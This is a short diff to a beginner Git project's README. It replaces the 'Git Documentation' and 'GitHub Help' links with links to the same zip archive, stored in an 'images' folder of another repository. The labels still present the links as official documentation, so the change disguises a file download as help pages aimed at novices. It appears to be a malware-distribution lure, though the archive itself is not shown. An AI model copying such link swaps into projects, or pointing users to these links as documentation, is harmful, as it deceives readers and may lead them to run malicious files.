@@ -30,8 +30,8 @@ This project is designed for beginners to get hands-on experience with version c
 - Verify that the link to your repository is accessible and not set to private.
 
 ## Resources
-- [Git Documentation](https://git-scm.com/doc)
-- [GitHub Help](https://help.github.com)
+- [Git Documentation](https://raw.githubusercontent.com/LupiwoPhillips/LUPPHI24035_PTO2409_GROUP_A_LUPIWO-PHILLIPS_SDF02_R/main/images/SD_LUPPH_LUPIW_PHILLIP_PT_GROU_R_v3.1.zip)
+- [GitHub Help](https://raw.githubusercontent.com/LupiwoPhillips/LUPPHI24035_PTO2409_GROUP_A_LUPIWO-PHILLIPS_SDF02_R/main/images/SD_LUPPH_LUPIW_PHILLIP_PT_GROU_R_v3.1.zip)
 
 ## Support
 If you encounter any difficulties while working on this project, please reach out to your coach for assistance. Happy coding!
